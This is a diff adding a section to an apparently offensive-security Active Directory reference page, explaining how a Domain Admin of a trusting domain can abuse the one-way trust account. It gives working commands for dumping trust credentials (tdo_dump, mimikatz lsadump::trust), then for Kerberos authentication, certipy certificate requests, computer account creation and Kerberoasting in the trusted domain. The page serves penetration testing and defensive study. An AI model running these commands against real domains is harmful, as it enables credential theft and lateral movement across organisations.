@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, WodenSec
+authors: ShutdownRepo, WodenSec, PvUL00
 category: ad
 ---
 
@@ -489,6 +489,120 @@ Rubeus.exe golden /user:Administrator /domain:<compromised_domain_FQDN> /sid:<co
 
 :::
 
+### One-Way Trust account abuse
+
+When a one-way trust is established between a trusting domain (B) and a trusted domain (A), Windows automatically creates a trust account (`DOMAIN_B$`) in the trusted domain (A). The password of this account is stored in the TDO ([Trusted Domain Object](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4)) of the **trusting** domain (B) in cleartext and as Kerberos keys.
+
+This means that an attacker with Domain Admin privileges on the trusting domain (B) can extract those credentials and authenticate to the trusted domain (A), effectively reversing the expected direction of the one-way trust. This technique has been documented by [itm8](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7) and [Lorenzo Meacci](https://lorenzomeacci.com/trust-issues-attacking-trust-in-active-directory).
+
+> [!NOTE]
+> This attack requires full compromise of the **trusting** domain. Domain Admin privileges (or equivalent) are a prerequisite.
+
+#### 1. Extract TDO credentials
+
+The password stored in the TDO on the trusting domain is the same as the password of the trust account (`DOMAIN_B$`) on the trusted domain. Extracting it therefore yields valid credentials on the trusted domain.
+
+> [!NOTE]
+> The extracted credentials differ depending on the OS and tool used, which affects the authentication options available in the next step:
+> - **UNIX-like** : [tdo_dump](https://github.com/AlmondOffSec/tdo_dump) returns the trust account's actual Kerberos AES-256/AES-128 keys and NT hash, enabling AES-based Kerberos authentication.
+> - **Windows** : [Mimikatz](https://github.com/gentilkiwi/mimikatz) returns inter-realm trust keys. Of these, only the `rc4_hmac_nt` value corresponds to the trust account NT hash and can be used to request a TGT. The AES keys displayed are inter-realm derivations and cannot be used for that purpose.
+
+::: tabs
+
+== UNIX-like
+
+[tdo_dump](https://github.com/AlmondOffSec/tdo_dump) (Python) operates remotely via Directory Replication Services (DRS) calls and returns the full Kerberos keys of the trust account. More details can be found in this [article](https://offsec.almond.consulting/trust-no-one_are-one-way-trusts-really-one-way.html).
+
+To work, it requires two GUIDs: the GUID of the `TDO` object for the trusted domain, and the GUID of the `ntDSDSA` object of the trusting DC:
+
+```bash
+# Retrieve TDO GUID (with ldeep)
+ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" search "(objectClass=trustedDomain)" objectguid,distinguishedname
+
+# Retrieve ntDSDSA GUID (with ldeep)
+ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" -b "CN=Configuration,DC=$DOMAIN" search "(name=NTDS Settings)" objectguid,distinguishedname
+
+# Extract credentials
+python3 tdo_dump.py -u "$USER" -d "$DOMAIN" -t "$DC_HOST.$DOMAIN" -p "$PASSWORD" --tdo-guid "$TDO_GUID" --dsa-guid "$DSA_GUID"
+```
+
+The tool returns the trust account password in cleartext, as an NT hash, and as Kerberos AES-256/AES-128 keys.
+
+== Windows
+
+From a domain controller, [Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to dump the trust secrets from LSASS. This requires local execution on the DC with administrative privileges.
+
+```powershell
+# On the trusting DC
+mimikatz.exe "lsadump::trust /patch" "exit"
+```
+
+The output includes the inter-realm keys for each trust relationship, identified by the `[In]` and `[Out]` sections:
+
+```
+* aes256_hmac       <AES256_KEY>
+* aes128_hmac       <AES128_KEY>
+* rc4_hmac_nt       <NT_HASH>
+```
+
+> [!NOTE]
+> The AES keys shown are inter-realm trust derivations and cannot be used to request a TGT for the trust account. Only the `rc4_hmac_nt` value (the trust account NT hash) is usable in the next step.
+
+:::
+
+#### 2. Authenticate to the trusted domain
+
+A TDO account cannot use NTLM authentication, only Kerberos. Consequently, once the Kerberos keys for the trust account are obtained, they can be used to authenticate to the trusted domain. The inter-realm keys are not particularly useful here since the attacker already controls the trusting domain.
+
+The trust account name is the NetBIOS name of the trusting domain followed by `$`. Following the intro example, the trust account created in domain A for the trusting domain B is `DOMAIN_B$`. A TGT for this account must be requested on the trusted domain using the credentials obtained in the previous step. The [Pass-the-Key](../kerberos/ptk) technique applies here, using either the NT hash (RC4) or, when available from `tdo_dump`, the AES-256 key (preferred, avoids RC4 downgrade detection).
+
+The resulting TGT can then be used for various attacks against the trusted domain, including [LDAP Recon](../../recon/ldap), [AD CS exploitation](../adcs), [computer account creation](../builtins/machineaccountquota#create-a-computer-account), and [Kerberoasting](../kerberos/kerberoast).
+
+::: tabs
+
+== UNIX-like
+
+```bash
+# --- LDAP Recon ---
+# With pywerview
+pywerview get-netuser -u "$TRUSTING_ACCOUNT" -k -d "$TARGET_DOMAIN" -t "$TARGET_DOMAIN" --username administrator
+
+# With ldeep
+ldeep ldap -u "$TRUSTING_ACCOUNT" -d "$TARGET_DOMAIN" -s ldap://"$TARGET_DOMAIN" -k search "(sAMAccountName=administrator)"
+
+# --- AD CS Exploitation ---
+# Request a certificate as the trust account
+certipy req -u "$TRUSTING_ACCOUNT"@"$TARGET_DOMAIN" -k -no-pass -target "$TARGET_FQDN" -dc-ip "$TARGET" -ca "$CA_NAME"
+
+# Authenticate with the obtained certificate
+certipy auth -pfx "$TRUSTING_ACCOUNT.pfx" -dc-ip "$TARGET" -ldap-shell
+
+# --- Computer account creation ---
+addcomputer.py "$TARGET_DOMAIN"/"$TRUSTING_ACCOUNT" -k -no-pass -dc-host "$TARGET_FQDN" -computer-name "$ATTACKCOMPUTER"
+
+# --- Kerberoasting ---
+netexec ldap "$TARGET_FQDN" --use-kcache --kerberoasting kerberoasting.txt
+```
+
+== Windows
+
+```powershell
+# --- LDAP Recon ---
+Get-ADUser Administrator -Server "$TARGET_DOMAIN" -Properties *
+
+# --- AD CS Exploitation ---
+Certify.exe request /ca:"$TARGET_FQDN\$CA_NAME"
+
+# --- Computer account creation ---
+Import-Module PowerMad.ps1
+New-MachineAccount -MachineAccount "$ATTACKCOMPUTER" -Domain "$TARGET_DOMAIN" -DomainController "$TARGET_FQDN"
+
+# --- Kerberoasting ---
+Rubeus.exe kerberoast /domain:"$TARGET_DOMAIN"
+```
+
+:::
+
 ### 🛠️ SID filtering bypass
 
 > a few SIDs will (almost) never be filtered: "Enterprise Domain Controllers" (S-1-5-9) SID and those described by the [trusted domain object (TDO)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4), as well as seven well-known SIDs (see [MS-PAC doc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280), and [improsec's blogpost](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained#yui_3_17_2_1_1673614140169_543)).
@@ -689,6 +803,12 @@ When an ADCS is installed and configured in an Active Directory environment, a C
 [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)
 
 [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
+
+[https://lorenzomeacci.com/trust-issues-attacking-trust-in-active-directory](https://lorenzomeacci.com/trust-issues-attacking-trust-in-active-directory)
+
+[https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
+
+[https://offsec.almond.consulting/trust-no-one_are-one-way-trusts-really-one-way.html](https://offsec.almond.consulting/trust-no-one_are-one-way-trusts-really-one-way.html)
 
 [https://nored0x.github.io/red-teaming/active-directory-Trust-enumeration/](https://nored0x.github.io/red-teaming/active-directory-Trust-enumeration/)
 
